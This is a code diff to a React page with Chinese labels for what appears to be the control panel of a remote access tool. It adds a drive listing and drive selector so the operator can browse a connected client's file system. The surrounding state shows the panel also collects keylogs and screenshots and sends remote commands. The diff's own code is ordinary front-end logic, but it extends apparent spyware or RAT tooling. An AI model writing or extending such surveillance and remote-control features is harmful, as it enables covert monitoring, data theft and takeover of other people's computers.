@@ -794,8 +794,9 @@ export default function Home() {
   const [selectedClient, setSelectedClient] = useState<any>(null)
   const [screenshotUrl, setScreenshotUrl] = useState('')
   const [screenViewActive, setScreenViewActive] = useState(false)
-  const [directoryItems, setDirectoryItems] = useState<any[]>([])
-  const [currentPath, setCurrentPath] = useState('.')
+  const [directoryItems, setDirectoryItems] = useState<Array<{name: string; path: string; type: string; size?: number}>>([])
+  const [currentPath, setCurrentPath] = useState('')
+  const [availableDrives, setAvailableDrives] = useState<string[]>([])
   const [processes, setProcesses] = useState<any[]>([])
   const [keylogContent, setKeylogContent] = useState('')
   const [remoteCommand, setRemoteCommand] = useState('')
@@ -855,6 +856,26 @@ export default function Home() {
       }
     } catch (error) {
       console.error('获取命令结果失败:', error)
+    }
+  }
+
+  const getClientDrives = async (clientId: string) => {
+    try {
+      await sendRemoteCommand(clientId, '', 'drives')
+      setTimeout(async () => {
+        const cmdResponse = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
+        const cmdResult = await cmdResponse.json()
+        if (cmdResult.result) {
+          try {
+            const drives = JSON.parse(cmdResult.result)
+            setAvailableDrives(drives)
+          } catch (e) {
+            console.error('解析磁盘列表失败:', e)
+          }
+        }
+      }, 500)
+    } catch (error) {
+      console.error('获取磁盘列表失败:', error)
     }
   }
 
@@ -1221,21 +1242,40 @@ export default function Home() {
                       <h3>
                         <i className="fas fa-folder-open"></i> 文件浏览
                       </h3>
-                      <div style={{ display: 'flex', gap: '0.5rem' }}>
+                      <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
+                        <select 
+                          className="form-control"
+                          onChange={(e) => {
+                            getClientDirectory(selectedClient.id, e.target.value)
+                          }}
+                          style={{ padding: '0.3rem', borderRadius: '4px' }}
+                        >
+                          <option value="">选择磁盘</option>
+                          {availableDrives.map((drive) => (
+                            <option key={drive} value={drive}>{drive}</option>
+                          ))}
+                        </select>
+                        <button 
+                          className="btn btn-sm" 
+                          onClick={() => getClientDrives(selectedClient.id)}
+                          style={{ background: '#1abc9c' }}
+                        >
+                          <i className="fas fa-refresh"></i> 刷新磁盘
+                        </button>
                         <button 
                           className="btn btn-sm" 
                           onClick={handleGoBack}
-                          disabled={!currentPath || currentPath === '.' || currentPath === '/' || currentPath === 'drives' || !!currentPath.match(/^[A-Za-z]:\\?$/)}
-                          style={{ background: '#95a5a6', opacity: (!currentPath || currentPath === '.' || currentPath === '/' || currentPath === 'drives' || !!currentPath.match(/^[A-Za-z]:\\?$/)) ? 0.5 : 1, cursor: (!currentPath || currentPath === '.' || currentPath === '/' || currentPath === 'drives' || !!currentPath.match(/^[A-Za-z]:\\?$/)) ? 'not-allowed' : 'pointer' }}
+                          disabled={!currentPath || currentPath === '.' || currentPath === '/' || !!currentPath.match(/^[A-Za-z]:\\?$/)}
+                          style={{ background: '#95a5a6', opacity: (!currentPath || currentPath === '.' || currentPath === '/' || !!currentPath.match(/^[A-Za-z]:\\?$/)) ? 0.5 : 1, cursor: (!currentPath || currentPath === '.' || currentPath === '/' || !!currentPath.match(/^[A-Za-z]:\\?$/)) ? 'not-allowed' : 'pointer' }}
                         >
                           <i className="fas fa-arrow-left"></i> 返回
                         </button>
                         <button 
                           className="btn btn-sm" 
-                          onClick={() => getClientDirectory(selectedClient.id, 'drives')}
+                          onClick={() => getClientDirectory(selectedClient.id, 'C:\\')}
                           style={{ background: '#3498db' }}
                         >
-                          <i className="fas fa-hard-drive"></i> 所有驱动器
+                          <i className="fas fa-home"></i> 根目录
                         </button>
                       </div>
                     </div>
